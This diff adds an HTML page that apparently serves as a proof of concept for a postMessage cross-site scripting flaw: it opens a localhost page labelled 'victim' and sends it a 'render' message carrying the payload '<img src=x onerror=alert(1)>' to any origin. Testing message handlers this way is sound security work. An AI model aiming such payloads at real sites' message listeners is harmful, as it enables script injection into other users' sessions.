@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      const win = window.open("http://localhost:5500/EventListener.html", "victim");
+
+      setTimeout(() => {
+        win.postMessage({
+          type: "render",
+          content: "<img src=x onerror=alert(1)>"
+        }, "*");
+      }, 1000);
+    </script>
+  </body>
+</html>
